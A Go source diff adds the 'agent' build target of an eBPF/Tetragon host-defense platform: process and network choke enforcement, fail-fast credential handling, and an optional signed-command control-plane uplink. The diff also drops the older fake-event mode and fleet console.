@@ -1,13 +1,43 @@
+// Command agent is the Choke Agent build target: the per-host, autonomous
+// sensing + enforcing core of the platform. It is the first half of the
+// agent / control-plane split described in docs/plan/architecture.md §1.
+//
+// STRANGLER NOTE (Phase 0). This entrypoint is deliberately introduced
+// ALONGSIDE cmd/engine, not by refactoring it. Both binaries compile over
+// the same internal/ packages (choke, enforce, score, tree, device, origin,
+// store, …) — the shared core is untouched. The agent wires the identical
+// in-kernel sensing + enforcing path cmd/engine runs today, minus two things
+// that architecture.md assigns elsewhere:
+//
+//   - fake mode  — a dev/UI convenience of the console binary, not part of
+//     the sensing+enforcing path; stays in cmd/engine.
+//   - fleet fan-out (chokectl) — a client-driven multi-host control pattern
+//     that becomes the control plane's command channel in
+//     Phase 1 (architecture.md §3.5). Not an agent concern.
+//
+// The event-handler glue below (handleExec/handleKprobe/…) is duplicated from
+// cmd/engine on purpose: extracting it into a shared package is the "hollow
+// out cmd/engine" step, which is Phase 1 (roadmap.md "Agent v1"), not Phase 0.
+// Until then the duplication is the accepted, temporary cost of the strangler
+// pattern — it keeps the live cmd/engine path behaviourally frozen while the
+// new build target proves it links cleanly against the shared core.
+//
+// Autonomy contract (the moat — architecture.md §2/§6): nothing here makes
+// in-kernel enforcement depend on a network service. The agent enforces from
+// local state; the uplink/enrollment/policy-pull machinery (Phase 1) is layered
+// on top without ever becoming a prerequisite for containment.
 package main
 
 import (
 	"context"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"log"
 	"net"
 	"os"
 	"os/signal"
+	"runtime"
 	"strings"
 	"sync/atomic"
 	"syscall"
@@ -16,13 +46,15 @@ import (
 	"github.com/cilium/tetragon/api/v1/tetragon"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
-	"google.golang.org/protobuf/types/known/wrapperspb"
 
+	ebpfsocv1 "github.com/jeffmk/ebpf-poc-engine/gen/ebpfsoc/v1"
 	"github.com/jeffmk/ebpf-poc-engine/internal/api"
 	"github.com/jeffmk/ebpf-poc-engine/internal/choke"
 	"github.com/jeffmk/ebpf-poc-engine/internal/choke/circuit"
 	"github.com/jeffmk/ebpf-poc-engine/internal/choke/tokens"
+	"github.com/jeffmk/ebpf-poc-engine/internal/command"
 	"github.com/jeffmk/ebpf-poc-engine/internal/config"
+	"github.com/jeffmk/ebpf-poc-engine/internal/cpclient"
 	"github.com/jeffmk/ebpf-poc-engine/internal/device"
 	"github.com/jeffmk/ebpf-poc-engine/internal/enforce"
 	"github.com/jeffmk/ebpf-poc-engine/internal/enforce/bpfmap"
@@ -33,40 +65,59 @@ import (
 	"github.com/jeffmk/ebpf-poc-engine/internal/origin"
 	"github.com/jeffmk/ebpf-poc-engine/internal/policy"
 	"github.com/jeffmk/ebpf-poc-engine/internal/score"
+	"github.com/jeffmk/ebpf-poc-engine/internal/signing"
 	"github.com/jeffmk/ebpf-poc-engine/internal/store"
 	"github.com/jeffmk/ebpf-poc-engine/internal/sysproc"
 	"github.com/jeffmk/ebpf-poc-engine/internal/tree"
+	"github.com/jeffmk/ebpf-poc-engine/internal/uplink"
 )
 
+// agentVersion identifies this build target in logs, metrics resource
+// attributes, and /api/system-health. Distinct from the engine's "0.2.0"
+// only by the "-agent" suffix so a fleet can tell the two build targets
+// apart during the transition without changing metric cardinality.
+const agentVersion = "0.2.0-agent"
+
 // gw is the global choke gateway. It is created in main() and read by the
-// event handlers. nil-safe: handlers check before dispatching.
+// event handlers. nil-safe: handlers check before dispatching. (Same shape
+// as cmd/engine — kept identical so the sensing path is byte-for-byte
+// equivalent in behaviour.)
 var gw *choke.Gateway
 
 // tetragonConnected mirrors the OTel gauge so the /api/system-health
 // handler can read live state without reaching into the metrics pipeline.
 var tetragonConnected atomic.Bool
 
+// upBuf is the control-plane telemetry buffer. It is nil unless -controlplane
+// is configured; the event handlers enqueue into it only when non-nil, so with
+// no control plane the agent's behaviour is exactly as before (autonomy first —
+// the uplink is additive and never on the enforcement path).
+var upBuf *uplink.Buffer
+
+// enqueueUplink buffers a record for shipment iff the control-plane uplink is
+// active. nil-safe and non-blocking.
+func enqueueUplink(rec *ebpfsocv1.TelemetryRecord) {
+	if upBuf != nil {
+		upBuf.Enqueue(rec)
+	}
+}
+
 func main() {
 	var (
 		tetragonAddr = flag.String("tetragon", "unix:///var/run/tetragon/tetragon.sock", "Tetragon gRPC address")
-		dbPath       = flag.String("db", "events.db", "SQLite database path")
-		httpAddr     = flag.String("http", ":8080", "HTTP listen address")
-		fakeMode     = flag.Bool("fake", false, "synthesize events instead of connecting to Tetragon (dev/UI mode)")
-		authUser     = flag.String("user", "admin", "dashboard username")
+		dbPath       = flag.String("db", "events.db", "SQLite database path (agent-local WAL / offline buffer)")
+		httpAddr     = flag.String("http", ":8080", "HTTP listen address for the local debug/health console; Phase 1 restricts this to localhost")
+		authUser     = flag.String("user", "admin", "local debug console username")
 		// SECURITY (Phase 0, deliverable #3): no plaintext credential default.
-		// Historically this defaulted to a known demo string, which meant every
-		// deployment that forgot to set a password silently shipped the same
-		// credential. That default is gone: a missing password now fails fast at
-		// startup (see the credential resolution below). Set -pass, -pass-hash,
-		// or pass/pass_hash in the config file; prefer pass_hash for production
-		// so plaintext never lands on disk. auth.go's crypto is unchanged.
-		authPass    = flag.String("pass", "", "dashboard password (plaintext; bcrypted at startup). REQUIRED unless -pass-hash or config supplies one — there is no built-in default; a missing password fails fast")
-		authHash    = flag.String("pass-hash", "", "bcrypt-hashed dashboard password; takes precedence over -pass when set")
-		secretPath  = flag.String("secret", "", "path to HMAC signing secret for session cookies; auto-generated 0600 if missing (default: /etc/ebpf-engine/secret)")
+		// A missing password fails fast below rather than silently shipping a
+		// known credential. Set -pass, -pass-hash, or pass/pass_hash in config.
+		authPass    = flag.String("pass", "", "local debug console password (plaintext; bcrypted at startup). REQUIRED unless -pass-hash or config supplies one — there is no built-in default")
+		authHash    = flag.String("pass-hash", "", "bcrypt-hashed console password; takes precedence over -pass when set")
+		secretPath  = flag.String("secret", "", "path to HMAC signing secret for session cookies; auto-generated 0600 if missing (default: /var/lib/ebpf-engine/secret)")
 		policiesDir = flag.String("policies", "policies", "directory containing TracingPolicy YAMLs (for read-only viewer)")
 		attacksDir  = flag.String("attacks", "attacks", "directory containing allowlisted attack scripts (for quick-fire panel)")
 		honeypotDir = flag.String("honeypots", "/var/lib/ebpf-engine/honey", "directory where decoy files are seeded; access fires alerts when watched by sensitive-files policy")
-		// Phase 1+2: choke gateway
+		// Choke gateway (process cgroup + BPF map data plane).
 		chokeDir     = flag.String("choke-policies", "policies/choke", "directory containing ChokePolicy YAMLs (DSL); empty disables policy-driven choking")
 		dryRun       = flag.Bool("dry-run", false, "shadow mode: record decisions but do not execute enforcement actions")
 		enforceFlag  = flag.Bool("enforce", false, "enable real enforcement (kill/throttle); when false, decisions are logged only")
@@ -76,39 +127,42 @@ func main() {
 		severAt      = flag.Int("sever-at", 40, "chain score at which to sever (SIGKILL)")
 		cgroupRoot   = flag.String("cgroup-root", cgroupv2.DefaultRoot, "cgroup v2 unified mount; choke-{throttled,tarpit,quarantined} are created under this root")
 		critBinsRaw  = flag.String("system-critical", "", "comma-separated list of binaries exempt from SCORE-DRIVEN auto-enforce (manual overrides still apply); empty = use the default safe list (sshd, systemd, dockerd, …)")
-		// Tier 1 fleet console (Fleet Console at /fleet). When this points at
-		// a chokectl-format hosts file, /api/fleet/* endpoints fan out to
-		// each peer and the embedded UI lets one operator drive N hosts.
-		fleetHosts = flag.String("fleet-hosts", "", "path to chokectl.hosts file; enables the /fleet console and /api/fleet/* fanout endpoints")
-		// cilium/ebpf data plane: when -bpf-obj points at a compiled
-		// choke.o the engine loads it and attaches cgroup/connect{4,6}
-		// programs to -bpf-cgroup. Empty -bpf-obj keeps the noop backend
-		// (in-memory mirror only — no kernel enforcement).
+		// cilium/ebpf process data plane.
 		bpfObj    = flag.String("bpf-obj", "", "path to compiled choke.o; empty disables the cilium/ebpf data plane and falls back to the in-memory noop backend")
 		bpfCgroup = flag.String("bpf-cgroup", "/sys/fs/cgroup", "cgroup v2 root to attach the BPF program to")
-		// Network (per-device / MAC) choke data plane. When -devchoke-obj
-		// points at a compiled devchoke.o AND -devchoke-iface names one or
-		// more LAN/bridge-slave interfaces, the engine loads it and attaches
-		// tc ingress+egress so it can throttle/block forwarded traffic by
-		// device MAC. Empty -devchoke-iface keeps the in-memory noop backend.
+		// Network (per-device / MAC) choke data plane.
 		devchokeObj     = flag.String("devchoke-obj", "", "path to compiled devchoke.o; empty disables the network device choke data plane")
 		devchokeIface   = flag.String("devchoke-iface", "", "comma-separated LAN/bridge-slave interfaces to attach the device choke to (e.g. eth0,eth1)")
-		devchokeProtect = flag.String("devchoke-protect", "", "comma-separated MAC allow-list (gateway/uplink/DHCP-DNS/operator) the engine refuses to quarantine/sever; interface MACs are auto-added")
-		// Storage backend. -db is reused as the SQLite path; -pg-dsn carries
-		// the Postgres connection string when -store=postgres.
+		devchokeProtect = flag.String("devchoke-protect", "", "comma-separated MAC allow-list (gateway/uplink/DHCP-DNS/operator) the agent refuses to quarantine/sever; interface MACs are auto-added")
+		// Storage backend. -db is the SQLite path; -pg-dsn carries the Postgres
+		// connection string when -store=postgres.
 		storeKind = flag.String("store", "sqlite", "storage backend: sqlite | postgres")
 		pgDSN     = flag.String("pg-dsn", "", "Postgres DSN (e.g. postgres://user:pass@host:5432/db?sslmode=disable); required when -store=postgres")
 		// Observability.
 		logFormat    = flag.String("log-format", "text", "log handler: text (dev) | json (production — for journald → Vector → Loki/Elastic)")
 		logLevel     = flag.String("log-level", "info", "log level: debug | info | warn | error")
 		otlpEndpoint = flag.String("otlp-endpoint", "", "OTLP/HTTP metrics endpoint (e.g. http://otel-collector:4318); 'stdout' to print metrics every 30s; empty disables metrics")
-		// YAML config file. Any field set in the file is used iff the
-		// matching CLI flag is still at its default — flags always win.
+		// YAML config file. Any field set in the file is used iff the matching
+		// CLI flag is still at its default — flags always win. Shared verbatim
+		// with cmd/engine (internal/config), so an operator's engine.yaml drops
+		// straight onto the agent.
 		configPath = flag.String("config", "", "path to YAML config file (every field has a CLI-flag equivalent; CLI flags override file values)")
+		// Control-plane uplink (Phase 1). EMPTY -controlplane keeps the agent
+		// fully standalone — no enrollment, no network, behaviour identical to a
+		// pre-Phase-1 agent. When set, the agent enrolls (mTLS) and runs the
+		// telemetry/heartbeat/command loops in the background; enforcement never
+		// depends on any of them (autonomy).
+		controlPlane   = flag.String("controlplane", "", "control-plane endpoint host:port; empty runs the agent standalone (no uplink)")
+		bootstrapToken = flag.String("bootstrap-token", "", "one-time enrollment token; required when -controlplane is set")
+		caBundlePath   = flag.String("ca-bundle", "", "path to the PEM CA bundle pinned to trust the control plane during enrollment; required when -controlplane is set")
+		cpServerName   = flag.String("controlplane-servername", "", "TLS server name for the control-plane certificate (defaults to the host part of -controlplane)")
+		fleetPubKey    = flag.String("fleet-pubkey", "", "path to the fleet command-signing ed25519 public key (hex); required to accept remote commands, otherwise the command channel is disabled")
 	)
 	flag.Parse()
 
-	// File config: load + merge before any flag value gets consumed.
+	// File config: load + merge before any flag value gets consumed. Note the
+	// pass default here is "" (not the old demo string) so ApplyString's
+	// still-default check works and a config-supplied pass is honoured.
 	if cfg, err := config.Load(*configPath); err != nil {
 		log.Fatalf("config: %v", err)
 	} else if cfg != nil {
@@ -116,7 +170,7 @@ func main() {
 		config.ApplyString(dbPath, cfg.DB, "events.db")
 		config.ApplyString(httpAddr, cfg.HTTP, ":8080")
 		config.ApplyString(authUser, cfg.User, "admin")
-		config.ApplyString(authPass, cfg.Pass, "") // no default: missing password fails fast below
+		config.ApplyString(authPass, cfg.Pass, "")
 		config.ApplyString(authHash, cfg.PassHash, "")
 		config.ApplyString(secretPath, cfg.SecretPath, "")
 		config.ApplyString(policiesDir, cfg.PoliciesDir, "policies")
@@ -131,7 +185,6 @@ func main() {
 		config.ApplyInt(severAt, cfg.SeverAt, 40)
 		config.ApplyString(cgroupRoot, cfg.CgroupRoot, cgroupv2.DefaultRoot)
 		config.ApplyString(critBinsRaw, cfg.SystemCritical, "")
-		config.ApplyString(fleetHosts, cfg.FleetHosts, "")
 		config.ApplyString(bpfObj, cfg.BPFObj, "")
 		config.ApplyString(bpfCgroup, cfg.BPFCgroup, "/sys/fs/cgroup")
 		config.ApplyString(devchokeObj, cfg.DevchokeObj, "")
@@ -146,13 +199,27 @@ func main() {
 	}
 
 	// Logging: install slog as the default and bridge stdlib log onto it.
-	// Existing log.Printf("…") calls keep working but emit structured records.
 	logging.Setup(*logFormat, *logLevel)
+	log.Printf("[agent] choke-agent %s starting (sensing+enforcing build target)", agentVersion)
 
-	// Metrics: OTel meter provider + instruments. Empty endpoint disables
-	// the SDK entirely (instruments stay nil; the safe* helpers no-op).
+	// SECURITY fail-fast (Phase 0, deliverable #3): resolve the console
+	// credential and refuse to start if none was supplied. Historically -pass
+	// defaulted to a known demo string; that default is gone, so a missing
+	// password must now be a hard startup error rather than a silent,
+	// shipped-everywhere credential. auth.go's crypto is untouched — we simply
+	// never hand it an empty password.
+	credential := *authPass
+	if *authHash != "" {
+		credential = *authHash // pre-hashed bcrypt: NewAuth detects $2a$/$2b$/$2y$ prefix
+	}
+	if credential == "" {
+		log.Fatalf("auth: no console credential configured — set -pass, -pass-hash, or pass/pass_hash in the config file; the built-in demo default has been removed so a missing password fails fast instead of shipping a known credential")
+	}
+
+	// Metrics: OTel meter provider + instruments. Empty endpoint disables the
+	// SDK entirely (instruments stay nil; the safe* helpers no-op).
 	hostname, _ := os.Hostname()
-	mp, err := metrics.Init(context.Background(), *otlpEndpoint, hostname, "0.2.0")
+	mp, err := metrics.Init(context.Background(), *otlpEndpoint, hostname, agentVersion)
 	if err != nil {
 		log.Fatalf("metrics: %v", err)
 	}
@@ -191,7 +258,7 @@ func main() {
 		if err != nil {
 			log.Fatalf("store: sqlite: %v", err)
 		}
-		log.Printf("[store] sqlite at %s", *dbPath)
+		log.Printf("[store] sqlite at %s (agent-local offline buffer)", *dbPath)
 	default:
 		log.Fatalf("store: unknown backend %q (want sqlite or postgres)", *storeKind)
 	}
@@ -200,39 +267,23 @@ func main() {
 	pt := tree.New(10 * time.Minute)
 	broadcast := make(chan api.Broadcast, 1024)
 
-	credential := *authPass
-	if *authHash != "" {
-		credential = *authHash // pre-hashed bcrypt: NewAuth detects $2a$/$2b$/$2y$ prefix
-	}
-	// SECURITY fail-fast (Phase 0, deliverable #3): refuse to start without a
-	// credential rather than silently shipping the old known default. auth.go's
-	// crypto is untouched — we simply never hand NewAuth an empty password
-	// (bcrypt would happily hash "" and stand up a blank-password account).
-	if credential == "" {
-		log.Fatalf("auth: no dashboard credential configured — set -pass, -pass-hash, or pass/pass_hash in the config file; the built-in demo default has been removed so a missing password fails fast instead of shipping a known credential")
-	}
 	auth, err := api.NewAuth(*authUser, credential, *secretPath)
 	if err != nil {
 		log.Fatalf("auth: %v", err)
 	}
+	// Local debug/health console. This is the agent's field-diagnostics
+	// surface (architecture.md §2 "minimal localhost-only debug/health
+	// endpoint"); the multi-tenant console lives in the control plane. No
+	// fleet fan-out is wired here — that pattern moves to the control plane's
+	// command channel in Phase 1.
 	httpSrv := api.NewServer(st, pt, broadcast, auth)
-	if *fleetHosts != "" {
-		// Same credentials chokectl uses by default; the engine itself acts
-		// as the operator presenting them to peers. Per-peer audit chains
-		// remain the tamper-evident record.
-		httpSrv.SetFleet(api.NewFleet(*fleetHosts, *authUser, *authPass))
-		log.Printf("[fleet] console enabled at /fleet (hosts=%s)", *fleetHosts)
-	}
 	go func() {
 		if err := httpSrv.Start(*httpAddr); err != nil {
 			log.Fatalf("http: %v", err)
 		}
 	}()
 
-	// ---- Choke Gateway (phases 1 & 2) -------------------------------------
-	// Backends: throttler writes per-PID rate buckets into the BPF map (via
-	// the cilium/ebpf loader when -bpf-obj is set, otherwise the in-memory
-	// noop backend); severer sends SIGKILL on ActSever. Composed via Multi.
+	// ---- Choke Gateway (process cgroup + BPF map) -------------------------
 	var bpfBackend bpfmap.Backend
 	if *bpfObj != "" {
 		cilium := bpfmap.NewCiliumEBPFBackend(*bpfObj, *bpfCgroup)
@@ -259,9 +310,7 @@ func main() {
 	}
 	defer bpfBackend.Close()
 
-	// BPF map size: periodic gauge reporter. Snapshot iterates the hash
-	// map; 10s is generous for an SRE-grade gauge and keeps the cost off
-	// the event hot path.
+	// BPF map size: periodic gauge reporter, off the event hot path.
 	go func() {
 		t := time.NewTicker(10 * time.Second)
 		defer t.Stop()
@@ -276,9 +325,9 @@ func main() {
 	throttleBackend := &enforce.Throttler{Backend: bpfBackend}
 	severerBackend := &enforce.Severer{}
 
-	// cgroup v2 backend — real per-PID throttle / tarpit / quarantine on
-	// Linux. On non-Linux this is a no-op stub (Apply returns
-	// ErrUnsupported) so the engine still compiles and runs in dev mode.
+	// cgroup v2 backend — real per-PID throttle / tarpit / quarantine on Linux.
+	// On non-Linux this is a no-op stub so the agent still compiles and runs in
+	// dev mode.
 	cgBackend := cgroupv2.NewBackend(*cgroupRoot)
 	if cgBackend.Available() {
 		if err := cgBackend.Mgr.Setup(); err != nil {
@@ -290,14 +339,9 @@ func main() {
 		log.Printf("[cgroupv2] not available at %s — graduated enforcement disabled (sever still works via SIGKILL)", *cgroupRoot)
 	}
 
-	// Order matters: the cgroup backend handles throttle/tarpit/quarantine
-	// (real kernel-level choke), the severer handles sever (SIGKILL), and
-	// the throttler trails as a telemetry mirror writing to the noop
-	// bpfmap so the UI's "Choke Map (kernel)" panel still populates.
-	//
-	// We always build BOTH enforcer chains and hand them to the gateway so
-	// the operator can flip detect-only ⇄ enforcing at runtime via
-	// /api/choke/mode. -enforce only picks which one is active at boot.
+	// Always build BOTH enforcer chains and hand them to the gateway so the
+	// operator can flip detect-only ⇄ enforcing at runtime via /api/choke/mode.
+	// -enforce only picks which one is active at boot.
 	realEnforcer := &enforce.Multi{
 		Backends: []enforce.Enforcer{cgBackend, severerBackend, throttleBackend},
 	}
@@ -307,8 +351,10 @@ func main() {
 		enforcer = loggerEnforcer
 	}
 
-	// Policy DSL — load all *.yaml under -choke-policies. Missing dir is
-	// not an error; you just get no DSL-driven choking.
+	// Policy DSL — load all *.yaml under -choke-policies. Missing dir is not an
+	// error; you just get no DSL-driven choking. In Phase 1 this local dir
+	// becomes the bootstrap/fallback for signed policy bundles pulled from the
+	// control plane (architecture.md §2).
 	policySet := policy.NewSet()
 	if *chokeDir != "" {
 		set, warns, err := policy.LoadDir(*chokeDir)
@@ -323,10 +369,9 @@ func main() {
 		}
 	}
 
-	// system-critical exemption list — comma-separated CLI override or
-	// the package's safe defaults (sshd, systemd, dockerd, …). Score-
-	// driven transitions on these binaries are audited but the enforcer
-	// is bypassed; manual overrides still go through.
+	// system-critical exemption list — comma-separated CLI override or the
+	// package's safe defaults. Score-driven transitions on these binaries are
+	// audited but the enforcer is bypassed; manual overrides still go through.
 	var critBins []string
 	if *critBinsRaw != "" {
 		for _, b := range strings.Split(*critBinsRaw, ",") {
@@ -364,9 +409,8 @@ func main() {
 	// ---- Network Choke Gateway (per-device / MAC) -------------------------
 	// A parallel data plane: tc clsact programs keyed by MAC on the LAN /
 	// bridge-slave interfaces, independent of the process choke above. Loads
-	// only when -devchoke-obj + -devchoke-iface are set; otherwise an
-	// in-memory noop backend keeps the /api/choke/device-* endpoints alive
-	// (useful for UI iteration). Operator/manual-driven — no score path.
+	// only when -devchoke-obj + -devchoke-iface are set; otherwise an in-memory
+	// noop backend keeps the /api/choke/device-* endpoints alive.
 	devIfaces := splitCSV(*devchokeIface)
 	var devBackend devbpf.Backend
 	if *devchokeObj != "" && len(devIfaces) > 0 {
@@ -389,9 +433,9 @@ func main() {
 	}
 	defer devBackend.Close()
 
-	// Protected MAC allow-list: operator-supplied (gateway/uplink/DHCP-DNS/
-	// operator workstation) PLUS the configured interfaces' own hardware
-	// addresses, so the box can never quarantine/sever its own bridge ports.
+	// Protected MAC allow-list: operator-supplied PLUS the configured
+	// interfaces' own hardware addresses, so the box can never quarantine/sever
+	// its own bridge ports.
 	protected := map[devbpf.MAC]bool{}
 	for _, m := range splitCSV(*devchokeProtect) {
 		if mac, err := devbpf.ParseMAC(m); err == nil {
@@ -417,22 +461,20 @@ func main() {
 		Broadcast: httpSrv,
 		DryRun:    *dryRun,
 		// Device choke starts detect-only just like the process gateway.
-		// Operators explicitly flip to enforcing at runtime after confirming
-		// protected MACs and data-plane reachability.
 		Enforcing: false,
 	})
 	httpSrv.SetDeviceGateway(deviceGW)
 	log.Printf("[devgateway] network device choke ready (ifaces=%q protected=%d dry_run=%v)",
 		*devchokeIface, len(protected), *dryRun)
 
-	// Wire cgroup pass-throughs so /api/choke/cgroups + /api/choke/thaw
-	// reach the manager without dragging the linux-only package into
-	// the choke package itself.
+	// Wire cgroup pass-throughs so /api/choke/cgroups + /api/choke/thaw reach
+	// the manager without dragging the linux-only package into the choke
+	// package itself.
 	gw.SetCgroupInhabitorsFn(cgBackend.Mgr.Inhabitants)
 	gw.SetThawFn(cgBackend.Mgr.Thaw)
-	// Process picker: read /proc on every request and adapt the slice
-	// shape into the gateway's choke.SysProcEntry to keep the choke
-	// package free of OS-specific imports.
+	// Process picker: read /proc on every request and adapt the slice shape
+	// into the gateway's choke.SysProcEntry to keep the choke package free of
+	// OS-specific imports.
 	gw.SetSysProcListFn(func() ([]choke.SysProcEntry, error) {
 		raw, err := sysproc.List()
 		if err != nil {
@@ -448,15 +490,11 @@ func main() {
 		}
 		return out, nil
 	})
-	// Live /proc snapshot for the inspect drawer — same OS-isolation
-	// pattern as SetSysProcListFn so the gateway package stays free of
-	// /proc imports. Backend is no-op on non-Linux dev builds.
 	// Origin tracker — attributes processes to the remote client that
-	// triggered them (e.g. an SSH session's source IP + key fingerprint).
-	// The journald tailer is the source of SSH attribution on Linux; on
-	// other platforms the tracker stays empty and decisions simply carry
-	// no origin fields. 30-minute TTL covers typical SSH session lifetimes
-	// without unbounded growth.
+	// triggered them (e.g. an SSH session's source IP + key fingerprint). The
+	// journald tailer is the source of SSH attribution on Linux; on other
+	// platforms the tracker stays empty and decisions simply carry no origin
+	// fields. 30-minute TTL covers typical SSH session lifetimes.
 	originTracker := origin.NewTracker(30 * time.Minute)
 	httpSrv.SetOriginSnapshotFn(func() map[uint32]map[string]interface{} {
 		raw := originTracker.Snapshot()
@@ -474,10 +512,9 @@ func main() {
 		return out
 	})
 	gw.SetOriginLookupFn(func(pid uint32, execID string) (choke.OriginInfo, bool) {
-		// Walk ancestors via the engine's in-memory process tree. The tree
-		// holds nodes for ~10 minutes after exit, so short-lived chains
-		// (SSH MOTD scripts that die in ms) still resolve to their
-		// per-session sshd parent. /proc would have lost them already.
+		// Walk ancestors via the in-memory process tree. The tree holds nodes
+		// for ~10 minutes after exit, so short-lived chains still resolve to
+		// their per-session sshd parent. /proc would have lost them already.
 		ancestors := func(_ uint32) []uint32 {
 			if execID == "" {
 				return nil
@@ -532,10 +569,9 @@ func main() {
 	log.Printf("[gateway] %s; thresholds throttle=%d tarpit=%d quarantine=%d sever=%d",
 		mode, *throttleAt, *tarpitAt, *quarantineAt, *severAt)
 
-	// System health snapshot for /api/system-health (rendered by the
-	// "System Health" panel in the choke console). Closures so live
-	// values (BPF link count, map size, Tetragon stream state) are
-	// re-read on every request.
+	// System health snapshot for /api/system-health. Closures so live values
+	// (BPF link count, map size, Tetragon stream state) are re-read on every
+	// request.
 	bpfBackendKind := "noop"
 	bpfLinksFn := func() int { return 0 }
 	if cilium, ok := bpfBackend.(*bpfmap.CiliumEBPFBackend); ok {
@@ -547,7 +583,7 @@ func main() {
 		storeTarget = redactDSN(*pgDSN)
 	}
 	httpSrv.SetSystemInfo(api.SystemInfo{
-		Version:      "0.2.0",
+		Version:      agentVersion,
 		StartedAt:    time.Now().UTC(),
 		StoreBackend: *storeKind,
 		StoreTarget:  storeTarget,
@@ -569,14 +605,12 @@ func main() {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Start the sshd journald tailer (Linux only; soft-degrades on macOS
-	// dev builds and on hosts without journalctl in PATH). Any SSH session
-	// that authenticates after this point gets attributed in the tracker.
+	// Start the sshd journald tailer (Linux only; soft-degrades on macOS dev
+	// builds and on hosts without journalctl in PATH).
 	if err := origin.NewSSHDTailer(originTracker).Start(ctx); err != nil {
 		log.Printf("[origin/sshd] start failed: %v (continuing without SSH attribution)", err)
 	}
-	// Origin tracker sweeper — evicts entries older than the TTL once a
-	// minute so the map stays bounded even on busy boxes.
+	// Origin tracker sweeper — evicts entries older than the TTL once a minute.
 	go func() {
 		t := time.NewTicker(time.Minute)
 		defer t.Stop()
@@ -591,9 +625,9 @@ func main() {
 	}()
 
 	// Device discovery: passively sniff DHCP on the bridge for
-	// MAC<->IP<->hostname, and on a ticker drain the data plane's seen map
-	// (MAC + last source IP, in-kernel) and poll the neigh table. All feed
-	// the one DeviceTable the device gateway reads from.
+	// MAC<->IP<->hostname, and on a ticker drain the data plane's seen map and
+	// poll the neigh table. All feed the one DeviceTable the device gateway
+	// reads from.
 	device.StartDHCPSniffer(ctx, devIfaces, deviceTable.Record)
 	go func() {
 		t := time.NewTicker(10 * time.Second)
@@ -627,12 +661,81 @@ func main() {
 	signal.Notify(sigC, syscall.SIGINT, syscall.SIGTERM)
 	go func() { <-sigC; log.Println("shutting down"); cancel() }()
 
-	if *fakeMode {
-		log.Println("fake mode: synthesizing events (no Tetragon required)")
-		runFake(ctx, st, pt, broadcast)
-		return
+	// ---- Control-plane uplink (Phase 1, opt-in) ---------------------------
+	// Strictly additive: enforcement above is already fully wired and running.
+	// When -controlplane is set the agent enrolls (mTLS) and runs the telemetry
+	// drain, heartbeat, and command loops in the background. A down/slow control
+	// plane only means telemetry buffers locally and no new commands arrive —
+	// the kernel keeps enforcing the last-applied policy (the autonomy moat).
+	if *controlPlane != "" {
+		if *bootstrapToken == "" || *caBundlePath == "" {
+			log.Fatalf("controlplane: -controlplane requires -bootstrap-token and -ca-bundle")
+		}
+		caPEM, err := os.ReadFile(*caBundlePath)
+		if err != nil {
+			log.Fatalf("controlplane: read -ca-bundle: %v", err)
+		}
+		upBuf = uplink.NewBuffer()
+
+		// The command channel activates only with a fleet signing key. Commands
+		// are applied through the choke gateway with the SAME local
+		// system-critical guardrails as score-driven enforcement (critBins), so
+		// a remote command can never strip sudo/sshd protection.
+		var proc *command.Processor
+		if *fleetPubKey != "" {
+			raw, err := os.ReadFile(*fleetPubKey)
+			if err != nil {
+				log.Fatalf("controlplane: read -fleet-pubkey: %v", err)
+			}
+			pub, err := hex.DecodeString(strings.TrimSpace(string(raw)))
+			if err != nil {
+				log.Fatalf("controlplane: decode -fleet-pubkey: %v", err)
+			}
+			verifier, err := signing.VerifierFromPublicKey(pub)
+			if err != nil {
+				log.Fatalf("controlplane: -fleet-pubkey: %v", err)
+			}
+			proc = command.NewProcessor(verifier, gatewayApplier{gw: gw}, critBins)
+			log.Printf("[controlplane] command channel enabled (%d protected binaries guardrail)", len(critBins))
+		} else {
+			log.Printf("[controlplane] command channel DISABLED (no -fleet-pubkey); telemetry + heartbeat only")
+		}
+
+		serverName := *cpServerName
+		if serverName == "" {
+			serverName = hostOnly(*controlPlane)
+		}
+		agentInfo := func() *ebpfsocv1.AgentInfo {
+			return &ebpfsocv1.AgentInfo{Hostname: hostname, AgentVersion: agentVersion, Arch: runtime.GOARCH}
+		}
+		cfg := cpclient.Config{
+			Endpoint:       *controlPlane,
+			ServerName:     serverName,
+			BootstrapToken: *bootstrapToken,
+			CABundlePEM:    caPEM,
+			AgentInfo:      agentInfo(),
+			Buffer:         upBuf,
+			Processor:      proc,
+			Heartbeat: func() *ebpfsocv1.HeartbeatRequest {
+				return &ebpfsocv1.HeartbeatRequest{
+					AgentInfo:   agentInfo(),
+					DataPlane:   &ebpfsocv1.DataPlaneState{Mode: gatewayMode(gw)},
+					BufferDepth: uint64(upBuf.PendingDepth()),
+				}
+			},
+			Logf: log.Printf,
+		}
+		go func() {
+			if err := cpclient.Run(ctx, cfg); err != nil && ctx.Err() == nil {
+				log.Printf("[controlplane] client stopped: %v", err)
+			}
+		}()
+		log.Printf("[controlplane] uplink enabled → %s (tenant bound at enrollment)", *controlPlane)
 	}
 
+	// Tetragon subscription — the agent's sole event source. Unlike cmd/engine
+	// there is no fake mode here: the agent is a production sensor that runs
+	// next to Tetragon. Dev/UI iteration without a kernel uses cmd/engine -fake.
 	conn, err := grpc.Dial(*tetragonAddr,
 		grpc.WithTransportCredentials(insecure.NewCredentials()))
 	if err != nil {
@@ -665,125 +768,15 @@ func main() {
 	}
 }
 
-// runFake synthesizes a deterministic stream of attack-pattern events
-// through the same handlers. It exists so the UI, scoring, SSE, and
-// SQLite paths can be exercised end-to-end without a Linux/Tetragon
-// host. It runs until ctx is cancelled.
-func runFake(ctx context.Context, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast) {
-	scenarios := []func(seq int, st *store.Store, pt *tree.Tree, broadcast chan<- api.Broadcast){
-		fakeWebshell,
-		fakeReverseShell,
-		fakeCredentialTheft,
-		fakePrivEsc,
-		fakeLOLBin,
-	}
-
-	tick := time.NewTicker(4 * time.Second)
-	defer tick.Stop()
-
-	seq := 0
-	scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
-	seq++
-
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		case <-tick.C:
-			scenarios[seq%len(scenarios)](seq, st, pt, broadcast)
-			seq++
-		}
-	}
-}
-
-func fakeProcess(execID string, pid, uid uint32, binary, args string) *tetragon.Process {
-	return &tetragon.Process{
-		ExecId:    execID,
-		Pid:       wrapperspb.UInt32(pid),
-		Uid:       wrapperspb.UInt32(uid),
